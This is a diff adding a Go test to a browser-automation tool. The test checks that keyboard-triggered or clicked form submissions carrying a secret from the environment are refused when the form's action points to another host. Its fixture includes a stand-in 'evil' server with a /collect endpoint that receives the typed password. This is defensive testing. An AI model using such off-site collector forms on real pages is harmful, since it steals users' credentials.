@@ -4,7 +4,11 @@
 package flow
 
 import (
+	"context"
+	"fmt"
+	"net/http"
 	"strings"
+	"sync"
 	"testing"
 )
 
@@ -53,5 +57,96 @@ func TestKeyFlowHoldIsTheStepsOwn(t *testing.T) {
 				t.Errorf("%d orders placed", n)
 			}
 		})
+	}
+}
+
+// sink is another host that logs what it gets: where a page sends what
+// the flow typed when nothing stops it.
+type sink struct {
+	mu  sync.Mutex
+	got []string
+}
+
+func (k *sink) requests() []string {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	var out []string
+	for _, q := range k.got {
+		if q != "/favicon.ico" {
+			out = append(out, q)
+		}
+	}
+	return out
+}
+
+// Enter and Space send a form as a click does, so press steps and the
+// keys a key flow presses keep what the flow read from the environment
+// on the site: a form whose action is another host is refused, one on
+// the site is sent.
+func TestKeysKeepSecretsOnSite(t *testing.T) {
+	needChrome(t)
+	const fill = "  - fill: {selector: \"#pass\", value: \"${env:SOUNDCHECK_KEYS_CANARY}\"}\n"
+	for _, tc := range []struct{ name, keyboard, step string }{
+		{"mouse flow Enter in the field", "false", `press: {key: Enter, on: "#pass"}`},
+		{"mouse flow Space on the button", "false", `press: {key: Space, on: "#go"}`},
+		{"key flow Enter in the field", "send", `press: {key: Enter, on: "#pass"}`},
+		{"key flow Space on the button", "send", `press: {key: Space, on: "#go"}`},
+		{"key flow click on the field", "send", `click: "#pass"`},
+		{"key flow click on the button", "send", `click: "#go"`},
+	} {
+		for _, offSite := range []bool{true, false} {
+			t.Run(fmt.Sprintf("%s off site %v", tc.name, offSite), func(t *testing.T) {
+				other := &sink{}
+				evil := listen(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+					other.mu.Lock()
+					other.got = append(other.got, r.URL.RequestURI())
+					other.mu.Unlock()
+					fmt.Fprint(w, `<html><body>Got it</body></html>`)
+				}))
+				action := "/done"
+				if offSite {
+					action = evil.URL + "/collect"
+				}
+				var mu sync.Mutex
+				var done []string
+				site := listen(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+					if r.URL.Path == "/done" {
+						mu.Lock()
+						done = append(done, r.URL.Query().Get("pass"))
+						mu.Unlock()
+						fmt.Fprint(w, `<html><body>Done</body></html>`)
+						return
+					}
+					fmt.Fprintf(w, `<html><body><form method="get" action="%s">
+<input id="q" name="q"><input id="pass" name="pass" type="password"><button id="go">Go</button>
+</form></body></html>`, action)
+				}))
+				f, err := Parse([]byte("name: Keys\nkeyboard: " + tc.keyboard + "\nsteps:\n" + fill + "  - " + tc.step + "\n"))
+				if err != nil {
+					t.Fatal(err)
+				}
+				page := isolatedTab(t, site.URL+"/")
+				res := Play(context.Background(), page, f, keyOptions(site.URL))
+				if strings.Contains(describe(res)+strings.Join(res.Trace, "\n"), canary) {
+					t.Error("the canary leaked")
+				}
+				mu.Lock()
+				sent := append([]string(nil), done...)
+				mu.Unlock()
+				if !offSite {
+					if len(res.Failures) != 0 || len(sent) != 1 || sent[0] != canary {
+						t.Errorf("failures:\n%s\nsent %d times", describe(res), len(sent))
+					}
+					return
+				}
+				want := "not sending what the flow typed: " + hostOf(evil.URL) + " isn't the site being checked"
+				if len(res.Failures) != 1 || res.Failures[0].Step != 2 || !strings.HasPrefix(res.Failures[0].Err.Error(), want) {
+					t.Errorf("failures:\n%s\nwant step 2 refused", describe(res))
+				}
+				if hit := other.requests(); len(hit) != 0 {
+					t.Errorf("the other host saw %q", hit)
+				}
+			})
+		}
 	}
 }
